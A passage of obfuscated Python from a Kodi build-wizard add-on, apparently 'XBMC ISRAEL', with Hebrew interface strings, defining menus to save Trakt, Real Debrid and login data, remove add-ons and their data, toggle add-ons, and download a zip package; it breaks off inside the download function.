	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0OO0O00O00O0OOOO .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0O00O000OO0O00O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת פליליסט לאודר:  '%OO0O0O0000O00O0O0 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת הגדרות באפר: '%O00000OOOOOO00O0O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת רשימות ריפו:  '%OOO0000O00O0OOOOO .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	setView ('files','viewType')#line:3168
def traktMenu ():#line:3170
	OOOO000O00O0OO000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3171
	OOO00O00OO000000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3172
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3173
	addFile ('Save Trakt Data: %s'%OOOO000O00O0OO000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3174
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOO00O00OO000000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3176
	for OOOO000O00O0OO000 in traktit .ORDER :#line:3178
		O0OO0O00000O0O0O0 =TRAKTID [OOOO000O00O0OO000 ]['name']#line:3179
		OOOOOOO0O0000O00O =TRAKTID [OOOO000O00O0OO000 ]['path']#line:3180
		OO000O0OO00OO00OO =TRAKTID [OOOO000O00O0OO000 ]['saved']#line:3181
		O00O0O000O0O0000O =TRAKTID [OOOO000O00O0OO000 ]['file']#line:3182
		O000O0O00OOOO000O =wiz .getS (OO000O0OO00OO00OO )#line:3183
		O000OO00OOO00O0OO =traktit .traktUser (OOOO000O00O0OO000 )#line:3184
		OO0O0000O00O0OOO0 =TRAKTID [OOOO000O00O0OO000 ]['icon']if os .path .exists (OOOOOOO0O0000O00O )else ICONTRAKT #line:3185
		O0O000OO0000OO0O0 =TRAKTID [OOOO000O00O0OO000 ]['fanart']if os .path .exists (OOOOOOO0O0000O00O )else FANART #line:3186
		O000OO00O0OOO0000 =createMenu ('saveaddon','Trakt',OOOO000O00O0OO000 )#line:3187
		OO0O0OO0O0OOOOO0O =createMenu ('save','Trakt',OOOO000O00O0OO000 )#line:3188
		O000OO00O0OOO0000 .append ((THEME2 %'%s Settings'%O0OO0O00000O0O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOOO000O00O0OO000 )))#line:3189
		addFile ('[+]-> %s'%O0OO0O00000O0O0O0 ,'',icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,themeit =THEME3 )#line:3191
		if not os .path .exists (OOOOOOO0O0000O00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,menu =O000OO00O0OOO0000 )#line:3192
		elif not O000OO00OOO00O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOOO000O00O0OO000 ,icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,menu =O000OO00O0OOO0000 )#line:3193
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000OO00OOO00O0OO ,'authtrakt',OOOO000O00O0OO000 ,icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,menu =O000OO00O0OOO0000 )#line:3194
		if O000O0O00OOOO000O =="":#line:3195
			if os .path .exists (O00O0O000O0O0000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOOO000O00O0OO000 ,icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,menu =OO0O0OO0O0OOOOO0O )#line:3196
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOOO000O00O0OO000 ,icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,menu =OO0O0OO0O0OOOOO0O )#line:3197
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000O0O00OOOO000O ,'',icon =OO0O0000O00O0OOO0 ,fanart =O0O000OO0000OO0O0 ,menu =OO0O0OO0O0OOOOO0O )#line:3198
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3200
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3201
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3202
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3203
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3204
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3205
	setView ('files','viewType')#line:3206
def realMenu ():#line:3208
	OO00O0OO000OOOO0O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3209
	OOOOOOOO0000OOOO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3210
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3211
	addFile ('Save Real Debrid Data: %s'%OO00O0OO000OOOO0O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3212
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOOOOOO0000OOOO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3213
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3214
	for O000OOOOOOO000000 in debridit .ORDER :#line:3216
		OO00OOOO00OOO0000 =DEBRIDID [O000OOOOOOO000000 ]['name']#line:3217
		OOOO0O00O00OO0OOO =DEBRIDID [O000OOOOOOO000000 ]['path']#line:3218
		OOOOOOOO0O00O0OO0 =DEBRIDID [O000OOOOOOO000000 ]['saved']#line:3219
		OOOO000OO0OOOOO0O =DEBRIDID [O000OOOOOOO000000 ]['file']#line:3220
		O0O00O0O000O0O0O0 =wiz .getS (OOOOOOOO0O00O0OO0 )#line:3221
		OOOO0O0000OOO0O0O =debridit .debridUser (O000OOOOOOO000000 )#line:3222
		OOO0OOO00000OO0O0 =DEBRIDID [O000OOOOOOO000000 ]['icon']if os .path .exists (OOOO0O00O00OO0OOO )else ICONREAL #line:3223
		OO00O0O0O000OO0OO =DEBRIDID [O000OOOOOOO000000 ]['fanart']if os .path .exists (OOOO0O00O00OO0OOO )else FANART #line:3224
		O00O0OO00OOOOOO0O =createMenu ('saveaddon','Debrid',O000OOOOOOO000000 )#line:3225
		O0O0OOO000OO0OOO0 =createMenu ('save','Debrid',O000OOOOOOO000000 )#line:3226
		O00O0OO00OOOOOO0O .append ((THEME2 %'%s Settings'%OO00OOOO00OOO0000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O000OOOOOOO000000 )))#line:3227
		addFile ('[+]-> %s'%OO00OOOO00OOO0000 ,'',icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,themeit =THEME3 )#line:3229
		if not os .path .exists (OOOO0O00O00OO0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,menu =O00O0OO00OOOOOO0O )#line:3230
		elif not OOOO0O0000OOO0O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O000OOOOOOO000000 ,icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,menu =O00O0OO00OOOOOO0O )#line:3231
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOO0O0000OOO0O0O ,'authdebrid',O000OOOOOOO000000 ,icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,menu =O00O0OO00OOOOOO0O )#line:3232
		if O0O00O0O000O0O0O0 =="":#line:3233
			if os .path .exists (OOOO000OO0OOOOO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O000OOOOOOO000000 ,icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,menu =O0O0OOO000OO0OOO0 )#line:3234
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O000OOOOOOO000000 ,icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,menu =O0O0OOO000OO0OOO0 )#line:3235
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00O0O000O0O0O0 ,'',icon =OOO0OOO00000OO0O0 ,fanart =OO00O0O0O000OO0OO ,menu =O0O0OOO000OO0OOO0 )#line:3236
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3238
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3239
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3240
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3241
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3242
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3243
	setView ('files','viewType')#line:3244
def loginMenu ():#line:3246
	O0OO0000OO0OOOOO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3247
	O0O0OOO00OOOOO0O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3248
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3249
	addFile ('Save Login Data: %s'%O0OO0000OO0OOOOO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3250
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0O0OOO00OOOOO0O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3252
	for O0OO0000OO0OOOOO0 in loginit .ORDER :#line:3254
		O00000000OOO0O0O0 =LOGINID [O0OO0000OO0OOOOO0 ]['name']#line:3255
		O00OOO0OOOO000O0O =LOGINID [O0OO0000OO0OOOOO0 ]['path']#line:3256
		O00O0OO00O0OOO00O =LOGINID [O0OO0000OO0OOOOO0 ]['saved']#line:3257
		O00O00O0O0000000O =LOGINID [O0OO0000OO0OOOOO0 ]['file']#line:3258
		O0O0O0OOO0OO00000 =wiz .getS (O00O0OO00O0OOO00O )#line:3259
		OO0O00OOO000OOOO0 =loginit .loginUser (O0OO0000OO0OOOOO0 )#line:3260
		OO00O0OO0000O00O0 =LOGINID [O0OO0000OO0OOOOO0 ]['icon']if os .path .exists (O00OOO0OOOO000O0O )else ICONLOGIN #line:3261
		OOOOO0O00OO0O000O =LOGINID [O0OO0000OO0OOOOO0 ]['fanart']if os .path .exists (O00OOO0OOOO000O0O )else FANART #line:3262
		O0000O00000O0O00O =createMenu ('saveaddon','Login',O0OO0000OO0OOOOO0 )#line:3263
		OO0O00O0OOOOOO000 =createMenu ('save','Login',O0OO0000OO0OOOOO0 )#line:3264
		O0000O00000O0O00O .append ((THEME2 %'%s Settings'%O00000000OOO0O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OO0000OO0OOOOO0 )))#line:3265
		addFile ('[+]-> %s'%O00000000OOO0O0O0 ,'',icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,themeit =THEME3 )#line:3267
		if not os .path .exists (O00OOO0OOOO000O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,menu =O0000O00000O0O00O )#line:3268
		elif not OO0O00OOO000OOOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OO0000OO0OOOOO0 ,icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,menu =O0000O00000O0O00O )#line:3269
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O00OOO000OOOO0 ,'authlogin',O0OO0000OO0OOOOO0 ,icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,menu =O0000O00000O0O00O )#line:3270
		if O0O0O0OOO0OO00000 =="":#line:3271
			if os .path .exists (O00O00O0O0000000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OO0000OO0OOOOO0 ,icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,menu =OO0O00O0OOOOOO000 )#line:3272
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OO0000OO0OOOOO0 ,icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,menu =OO0O00O0OOOOOO000 )#line:3273
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0OOO0OO00000 ,'',icon =OO00O0OO0000O00O0 ,fanart =OOOOO0O00OO0O000O ,menu =OO0O00O0OOOOOO000 )#line:3274
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3276
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3277
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3278
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3279
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3280
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3281
	setView ('files','viewType')#line:3282
def fixUpdate ():#line:3284
	if KODIV <17 :#line:3285
		OO00OOOO000000O00 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3286
		try :#line:3287
			os .remove (OO00OOOO000000O00 )#line:3288
		except Exception as OO0OO000O00000O00 :#line:3289
			wiz .log ("Unable to remove %s, Purging DB"%OO00OOOO000000O00 )#line:3290
			wiz .purgeDb (OO00OOOO000000O00 )#line:3291
	else :#line:3292
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3293
def removeAddonMenu ():#line:3295
	OOO0OO0OOO00OOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3296
	OOO0OOO00000O0OO0 =[];OOOO0O0OOO0000OOO =[]#line:3297
	for O00OOO000O0OOOO00 in sorted (OOO0OO0OOO00OOO0O ,key =lambda O00OO00OOO0O00OO0 :O00OO00OOO0O00OO0 ):#line:3298
		O0000000O00O0000O =os .path .split (O00OOO000O0OOOO00 [:-1 ])[1 ]#line:3299
		if O0000000O00O0000O in EXCLUDES :continue #line:3300
		elif O0000000O00O0000O in DEFAULTPLUGINS :continue #line:3301
		elif O0000000O00O0000O =='packages':continue #line:3302
		O00000OOO00O0O000 =os .path .join (O00OOO000O0OOOO00 ,'addon.xml')#line:3303
		if os .path .exists (O00000OOO00O0O000 ):#line:3304
			OOO0OOO0O00OO0OOO =open (O00000OOO00O0O000 )#line:3305
			OOOOOO0O000OOO00O =OOO0OOO0O00OO0OOO .read ()#line:3306
			O0000O0OOOO0OO0OO =wiz .parseDOM (OOOOOO0O000OOO00O ,'addon',ret ='id')#line:3307
			OOO00OO0OOOO0O0O0 =O0000000O00O0000O if len (O0000O0OOOO0OO0OO )==0 else O0000O0OOOO0OO0OO [0 ]#line:3309
			try :#line:3310
				OO0O0OOOOO000OO0O =xbmcaddon .Addon (id =OOO00OO0OOOO0O0O0 )#line:3311
				OOO0OOO00000O0OO0 .append (OO0O0OOOOO000OO0O .getAddonInfo ('name'))#line:3312
				OOOO0O0OOO0000OOO .append (OOO00OO0OOOO0O0O0 )#line:3313
			except :#line:3314
				pass #line:3315
	if len (OOO0OOO00000O0OO0 )==0 :#line:3316
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3317
		return #line:3318
	if KODIV >16 :#line:3319
		O0O00O0OO0000O000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OOO00000O0OO0 )#line:3320
	else :#line:3321
		O0O00O0OO0000O000 =[];O00OO0O00OOO0OO0O =0 #line:3322
		O000OO0OOO0O00000 =["-- Click here to Continue --"]+OOO0OOO00000O0OO0 #line:3323
		while not O00OO0O00OOO0OO0O ==-1 :#line:3324
			O00OO0O00OOO0OO0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O000OO0OOO0O00000 )#line:3325
			if O00OO0O00OOO0OO0O ==-1 :break #line:3326
			elif O00OO0O00OOO0OO0O ==0 :break #line:3327
			else :#line:3328
				O00OOO0OO0OO00O0O =(O00OO0O00OOO0OO0O -1 )#line:3329
				if O00OOO0OO0OO00O0O in O0O00O0OO0000O000 :#line:3330
					O0O00O0OO0000O000 .remove (O00OOO0OO0OO00O0O )#line:3331
					O000OO0OOO0O00000 [O00OO0O00OOO0OO0O ]=OOO0OOO00000O0OO0 [O00OOO0OO0OO00O0O ]#line:3332
				else :#line:3333
					O0O00O0OO0000O000 .append (O00OOO0OO0OO00O0O )#line:3334
					O000OO0OOO0O00000 [O00OO0O00OOO0OO0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOO0OOO00000O0OO0 [O00OOO0OO0OO00O0O ])#line:3335
	if O0O00O0OO0000O000 ==None :return #line:3336
	if len (O0O00O0OO0000O000 )>0 :#line:3337
		wiz .addonUpdates ('set')#line:3338
		for OOO0OOOO000O00OO0 in O0O00O0OO0000O000 :#line:3339
			removeAddon (OOOO0O0OOO0000OOO [OOO0OOOO000O00OO0 ],OOO0OOO00000O0OO0 [OOO0OOOO000O00OO0 ],True )#line:3340
		xbmc .sleep (1000 )#line:3342
		if INSTALLMETHOD ==1 :OOO0O000OO00000OO =1 #line:3344
		elif INSTALLMETHOD ==2 :OOO0O000OO00000OO =0 #line:3345
		else :OOO0O000OO00000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3346
		if OOO0O000OO00000OO ==1 :wiz .reloadFix ('remove addon')#line:3347
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3348
def removeAddonDataMenu ():#line:3350
	if os .path .exists (ADDOND ):#line:3351
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3352
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3353
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3354
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3355
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3356
		OOOOOO00OOOO0OOO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3357
		for OOOOOOO0OOO0O0OOO in sorted (OOOOOO00OOOO0OOO0 ,key =lambda O00OOOOO00OOOO0OO :O00OOOOO00OOOO0OO ):#line:3358
			O000O00O000OO00O0 =OOOOOOO0OOO0O0OOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3359
			O00O0O0O00000OO0O =os .path .join (OOOOOOO0OOO0O0OOO .replace (ADDOND ,ADDONS ),'icon.png')#line:3360
			OO0000OOOO0O00000 =os .path .join (OOOOOOO0OOO0O0OOO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3361
			O0O00000000OO0O0O =O000O00O000OO00O0 #line:3362
			OOOOO00000O0O0OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3363
			for OOO0OO0O00OOOOOOO in OOOOO00000O0O0OOO :#line:3364
				O0O00000000OO0O0O =O0O00000000OO0O0O .replace (OOO0OO0O00OOOOOOO ,OOOOO00000O0O0OOO [OOO0OO0O00OOOOOOO ])#line:3365
			if O000O00O000OO00O0 in EXCLUDES :O0O00000000OO0O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O00000000OO0O0O #line:3366
			else :O0O00000000OO0O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O00000000OO0O0O #line:3367
			addFile (' %s'%O0O00000000OO0O0O ,'removedata',O000O00O000OO00O0 ,icon =O00O0O0O00000OO0O ,fanart =OO0000OOOO0O00000 ,themeit =THEME2 )#line:3368
	else :#line:3369
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3370
	setView ('files','viewType')#line:3371
def enableAddons ():#line:3373
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3374
	OO0OOO0OO0OOO0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3375
	OOO0O0OO0O0OOO00O =0 #line:3376
	for OO0OO000O00O0O0OO in sorted (OO0OOO0OO0OOO0O0O ,key =lambda OO0O00OO000O00O0O :OO0O00OO000O00O0O ):#line:3377
		OOO00OO000OOO00OO =os .path .split (OO0OO000O00O0O0OO [:-1 ])[1 ]#line:3378
		if OOO00OO000OOO00OO in EXCLUDES :continue #line:3379
		if OOO00OO000OOO00OO in DEFAULTPLUGINS :continue #line:3380
		O00OOO00000OO00O0 =os .path .join (OO0OO000O00O0O0OO ,'addon.xml')#line:3381
		if os .path .exists (O00OOO00000OO00O0 ):#line:3382
			OOO0O0OO0O0OOO00O +=1 #line:3383
			OO0OOO0OO0OOO0O0O =OO0OO000O00O0O0OO .replace (ADDONS ,'')[1 :-1 ]#line:3384
			OO0OOOOO0O00OO000 =open (O00OOO00000OO00O0 )#line:3385
			O0000OOOOOO0O0O00 =OO0OOOOO0O00OO000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3386
			O0OO0OO000O00O00O =wiz .parseDOM (O0000OOOOOO0O0O00 ,'addon',ret ='id')#line:3387
			OOOO0OOOOO0OOO00O =wiz .parseDOM (O0000OOOOOO0O0O00 ,'addon',ret ='name')#line:3388
			try :#line:3389
				OO00O0O000OO000OO =O0OO0OO000O00O00O [0 ]#line:3390
				OO0OOOO0000000000 =OOOO0OOOOO0OOO00O [0 ]#line:3391
			except :#line:3392
				continue #line:3393
			try :#line:3394
				OO0OO0OO0O00O0OO0 =xbmcaddon .Addon (id =OO00O0O000OO000OO )#line:3395
				O00000O00O000OO00 ="[COLOR green][Enabled][/COLOR]"#line:3396
				OO0OO0O000OO00O00 ="false"#line:3397
			except :#line:3398
				O00000O00O000OO00 ="[COLOR red][Disabled][/COLOR]"#line:3399
				OO0OO0O000OO00O00 ="true"#line:3400
				pass #line:3401
			O000OO000OO0OOOO0 =os .path .join (OO0OO000O00O0O0OO ,'icon.png')if os .path .exists (os .path .join (OO0OO000O00O0O0OO ,'icon.png'))else ICON #line:3402
			O000OOOOOOO00000O =os .path .join (OO0OO000O00O0O0OO ,'fanart.jpg')if os .path .exists (os .path .join (OO0OO000O00O0O0OO ,'fanart.jpg'))else FANART #line:3403
			addFile ("%s %s"%(O00000O00O000OO00 ,OO0OOOO0000000000 ),'toggleaddon',OO0OOO0OO0OOO0O0O ,OO0OO0O000OO00O00 ,icon =O000OO000OO0OOOO0 ,fanart =O000OOOOOOO00000O )#line:3404
			OO0OOOOO0O00OO000 .close ()#line:3405
	if OOO0O0OO0O0OOO00O ==0 :#line:3406
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3407
	setView ('files','viewType')#line:3408
def changeFeq ():#line:3410
	O0O0OO0O0OOOO00O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3411
	O00OO00O0000OO0O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O0OO0O0OOOO00O0 )#line:3412
	if not O00OO00O0000OO0O0 ==-1 :#line:3413
		wiz .setS ('autocleanfeq',str (O00OO00O0000OO0O0 ))#line:3414
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O0OO0O0OOOO00O0 [O00OO00O0000OO0O0 ]))#line:3415
def developer ():#line:3417
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3418
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3419
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3420
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3421
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3422
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3423
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3424
	setView ('files','viewType')#line:3426
def download (O0000O00O0O000O00 ,OO00OOOO00OOOO0O0 ):#line:3431
  OOOO0O0OO00O0000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3432
  OOO0OO0O0O0OOOOO0 =xbmcgui .DialogProgress ()#line:3433
  OOO0OO0O0O0OOOOO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3434
  O00OOOOO000OO0000 =os .path .join (OOOO0O0OO00O0000O ,'isr.zip')#line:3435
  O00OO0O0O0O0O000O =urllib2 .Request (O0000O00O0O000O00 )#line:3436
  OO000O0O0OO00OO0O =urllib2 .urlopen (O00OO0O0O0O0O000O )#line:3437
  O0000OOOOOO0000O0 =xbmcgui .DialogProgress ()#line:3439
  O0000OOOOOO0000O0 .create ("Downloading","Downloading "+name )#line:3440
  O0000OOOOOO0000O0 .update (0 )#line:3441
  O00OOO00O00000OO0 =OO00OOOO00OOOO0O0 #line:3442
  OOO0OO00OO000O00O =open (O00OOOOO000OO0000 ,'wb')#line:3443
  try :#line:3445
    O00000OOO0O0O000O =OO000O0O0OO00OO0O .info ().getheader ('Content-Length').strip ()#line:3446
    OO0000O0OO0O00OOO =True #line:3447
  except AttributeError :#line:3448
        OO0000O0OO0O00OOO =False #line:3449
  if OO0000O0OO0O00OOO :#line:3451
        O00000OOO0O0O000O =int (O00000OOO0O0O000O )#line:3452
  O00OO00OO000OO000 =0 #line:3454
  OO000000O00OO00OO =time .time ()#line:3455
  while True :#line:3456
        OOOO0OOO0O0O0O00O =OO000O0O0OO00OO0O .read (8192 )#line:3457
        if not OOOO0OOO0O0O0O00O :#line:3458
            sys .stdout .write ('\n')#line:3459
            break #line:3460
        O00OO00OO000OO000 +=len (OOOO0OOO0O0O0O00O )#line:3462
        OOO0OO00OO000O00O .write (OOOO0OOO0O0O0O00O )#line:3463
        if not OO0000O0OO0O00OOO :#line:3465
            O00000OOO0O0O000O =O00OO00OO000OO000 #line:3466
        if O0000OOOOOO0000O0 .iscanceled ():#line:3467
           O0000OOOOOO0000O0 .close ()#line:3468
           try :#line:3469
            os .remove (O00OOOOO000OO0000 )#line:3470
           except :#line:3471
            pass #line:3472
           break #line:3473
        O00OOO000OOO0O000 =float (O00OO00OO000OO000 )/O00000OOO0O0O000O #line:3474
        O00OOO000OOO0O000 =round (O00OOO000OOO0O000 *100 ,2 )#line:3475
        OOO00O0OO000O0O0O =O00OO00OO000OO000 /(1024 *1024 )#line:3476
